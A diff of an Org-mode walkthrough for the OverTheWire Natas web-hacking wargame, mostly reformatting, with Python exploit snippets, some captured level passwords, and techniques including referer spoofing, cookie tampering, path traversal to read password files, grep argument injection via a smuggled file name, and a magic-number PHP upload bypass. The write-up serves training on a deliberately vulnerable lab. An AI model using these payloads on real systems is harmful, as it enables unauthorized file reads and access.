@@ -36,7 +36,7 @@ View the source page and find the password:
 : g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
 
 * Level 1
-View the source page by using a short cut key (for me <C-u>, Ctrl+u):
+View the source page by using a short cut key (for me =Ctrl+u=):
 
 #+NAME: lvl1
 #+BEGIN_SRC sh :var PASS_NATAS1=pass1
@@ -62,9 +62,9 @@ Again view the source page. There is a line with a link to an image
 #+END_SRC
 
 This links to "http://natas2.natas.labs.overthewire.org/files/pixel.png", note 
-the /files/pixels.png. Which means it might be possible to explorer the files 
-'files' directory. Exploring "http://natas2.natas.labs.overthewire.org/files/" 
-it shows that there it another file called 'users.txt' which contains the 
+the =/files/pixels.png=. Which means it might be possible to explorer the =/files=
+directory. Exploring "http://natas2.natas.labs.overthewire.org/files/"
+it shows that there it another file called =users.txt= which contains the
 password for the next level.
 
 #+NAME: lvl2
@@ -90,7 +90,10 @@ View the source and find the line
 <!-- No more information leaks!! Not even Google will find it this time... -->
 #+END_SRC
 
-which hints at the 'robots.txt' file that contains the directories webcrawlers are not supossed to visit. From the 'robots.txt' we get the directory '/s3cr3t/' which contains the 'users.txt' file with the password for natas4.
+which hints at the =robots.txt= file that contains the directories
+webcrawlers are not supossed to visit. From the =robots.txt= we get
+the directory =/s3cr3t/= which contains the =users.txt= file with the
+password for natas4.
 
 #+NAME: lvl3
 #+BEGIN_SRC sh :var PASS_NATAS3=pass3
@@ -120,10 +123,19 @@ Access disallowed. You are visiting from "" while authorized users should come
 only from "http://natas5.natas.labs.overthewire.org/"
 #+END_SRC
 
-It is possible to simulate this by setting the referer in the header of the get
+It is possible to simulate this by setting the *referer* in the header of the get
 request to the natas5 website.
 
-First define a function that can find the password in the raw html text:
+First import some libraries and define a function that can find the
+password in the raw html text these will be used throughout the
+levels:
+
+#+NAME: imports
+#+begin_src python :results none :export code
+  import requests
+  from requests.auth import HTTPBasicAuth
+  import re
+#+end_src
 
 #+NAME: findpswd
 #+BEGIN_SRC python :results none :exports code
@@ -151,9 +163,6 @@ Now the code that changes the referer to natas5:
 
 #+NAME: lvl4
 #+BEGIN_SRC python :var PASS_NATAS4=pass4
-  import requests
-  from requests.auth import HTTPBasicAuth
-
   user, url = user_url(4)
   headers = {'referer': 'http://natas5.natas.labs.overthewire.org/'}
 
@@ -194,8 +203,8 @@ Lets inspect the headers to see what is happening
 #+RESULTS: lvl5.1
 : {'Date': 'Wed, 22 Feb 2023 14:54:38 GMT', 'Server': 'Apache/2.4.52 (Ubuntu)', 'Set-Cookie': 'loggedin=0', 'Vary': 'Accept-Encoding', 'Content-Encoding': 'gzip', 'Content-Length': '368', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=UTF-8'}
 
-The output show that the the Set-cookie loggedin=0, if that is changed to 
-loggedin=1 then that should give access to the password.
+The output show that the the Set-cookie =loggedin=0=, if that is
+changed to =loggedin=1= then that should give access to the password.
 
 #+NAME: lvl5.2
 #+BEGIN_SRC python :var PASS_NATAS5=pass5
@@ -227,7 +236,7 @@ contains the line:
 #+END_SRC
 
 Then going to the url
-[[view-source:http://natas6.natas.labs.overthewire.org/index-source.html]
+[[view-source:http://natas6.natas.labs.overthewire.org/index-source.html]]
 contains:
 
 #+BEGIN_SRC 
@@ -267,8 +276,8 @@ The source page says:
 #+END_SRC
 
 and there are two links, =Home= and =About=. When you click on =Home=
-or =About= the url changes to =index.php?page=Home= and
-=index.php?page=About= respectively. Changing either =Home= or =About=
+or =About= the url changes to =/index.php?page=Home= and
+=/index.php?page=About= respectively. Changing either =Home= or =About=
 with the path to the password file will give access to the password,
 i.e. =/index.php?page=/etc/natas_webpass/natas8=. This is know as a
 *path traversal attack*.
@@ -315,19 +324,22 @@ All we need to do is reverse this function on the given encoded secret:
 
 #+NAME: lvl8.1
 #+BEGIN_SRC python :var PASS_NATAS=lvl7
-import base64
+  from base64 import b64decode
 
-secret = "3d3d516343746d4d6d6c315669563362"
-# convert hex to binary
-binary_secret = bin(int(secret, 16))
-# convert the bits to a string of chars
-char_secret = ''.join(chr(int(binary_secret[i*8:i*8+8],2)) for i in range(len(binary_secret)//8))
-# reverse the string
-reverse_secret  = char_secret[::-1]
-# base64 decode the string
-#decoded_secret = base64.b64decode(reverse_secret.encode("ascii")).decode("ascii")
-decoded_secret = base64.b64decode(reverse_secret).decode("ascii")
-print("The decoded secret is: " + decoded_secret)
+  secret = "3d3d516343746d4d6d6c315669563362"
+
+  # convert hex to binary
+  binary_secret = bin(int(secret, 16))
+
+  # convert the bits to a string of chars
+  char_secret = ''.join(chr(int(binary_secret[i*8:i*8+8],2)) for i in range(len(binary_secret)//8))
+
+  # reverse the string
+  reverse_secret  = char_secret[::-1]
+
+  # base64 decode the string
+  decoded_secret = b64decode(reverse_secret).decode("ascii")
+  print("The decoded secret is: " + decoded_secret)
 #+END_SRC
 
 #+RESULTS: lvl8.1
@@ -341,17 +353,18 @@ print("The decoded secret is: " + decoded_secret)
 #+RESULTS: decoded_secret
 : oubWYf2kBq
 
-Now we can POST the secret to get the password.
+Now we can POST the secret, =DECODED_SECRET=: src_sh[:var
+s=decoded_secret]{echo "s"}, to get the password.
 
 #+NAME: lvl8.2
-#+BEGIN_SRC python :var decoded_secret=decoded_secret PASS_NATAS8=lvl7
-user, url = user_url(8)
-post_data = {"secret": decoded_secret, "submit": "submit"}
+#+BEGIN_SRC python :var DECODED_SECRET=decoded_secret PASS_NATAS8=lvl7
+  user, url = user_url(8)
+  post_data = {"secret": DECODED_SECRET, "submit": "submit"}
 
-# get request with the referer set to natas5
-r = requests.post(url, auth=HTTPBasicAuth(user, PASS_NATAS8), data=post_data)
+  # get request with the referer set to natas5
+  r = requests.post(url, auth=HTTPBasicAuth(user, PASS_NATAS8), data=post_data)
 
-print(find_pswd(r.text))
+  print(find_pswd(r.text))
 #+END_SRC
 
 #+RESULTS: lvl8.2
@@ -377,17 +390,15 @@ if($key != "") {
 }
 #+END_SRC
 
-So it is using grep to find results from 'dictionary.txt', but grep
-allows for multiple input files to search in and so if we input an
-extra file into the search box then it will search that file as well
-as 'dictionary.txt'. The file we want to include in the submit box is
-'etc/natas_webpass/natas10', the file that holds the password for the
-next level.
+So it is using =grep= to find results from =dictionary.txt=, but
+=grep= allows for multiple input files to search in and so if we input
+an extra file into the search box then it will search that file as
+well as =dictionary.txt=. The file we want to include in the submit
+box is =etc/natas_webpass/natas10=, the file that holds the password
+for the next level.
 
 #+NAME: lvl9
 #+BEGIN_SRC python :var PASS_NATAS9=pass9
-  import re
-
   user, url = user_url(9)
   post_data = {"needle": "'' /etc/natas_webpass/natas10", "submit": "submit"}
 
@@ -499,7 +510,6 @@ decode it:
 #+NAME: lvl11.3
 #+BEGIN_SRC python
 from urllib.parse import unquote
-from base64 import b64decode
 
 url_decoded_cookie = unquote(cookie)
 print(f'The url decoded cookie is:\n{url_decoded_cookie}')
@@ -509,11 +519,13 @@ print(f'The url decoded cookie is:\n{url_decoded_cookie}')
 : The url decoded cookie is:
 : MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5ofnh8e354bjY=
 
-The ~=~ show that the decoded cookie is likely base 64 encoded, let
+The === show that the decoded cookie is likely base 64 encoded, let
 decode it.
 
 #+NAME: lvl11.4
 #+begin_src python
+  from base64 import b64decode
+
   base64_decoded_cookie = b64decode(url_decoded_cookie).hex()
   print(f'The cookie/cipher text in hex is:\n{base64_decoded_cookie}')
 #+end_src
@@ -667,7 +679,7 @@ the password for natas13.
 * Natas 13
 This level is similar to level 12 but it uses =exif_imagetype= to
 check if the file being uploaded is actually an image. It does this by
-checking the /magic number/ at the beginning of the file. So if we can
+checking the *magic number* at the beginning of the file. So if we can
 insert this /magic number/ to the beginning of our php script than it
 will pass the =exif_imagetype= check will the server will execute the
 contents of the file. We will insert the /magic number/ by letting
@@ -726,7 +738,7 @@ the username and the password.
 #+RESULTS: lvl14
 : AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
 
-* Natas 15
+* COMMENT Natas 15
 
 #+BEGIN_SRC python :var PASS_NATAS15=lvl14
   user, url = user_url(15)
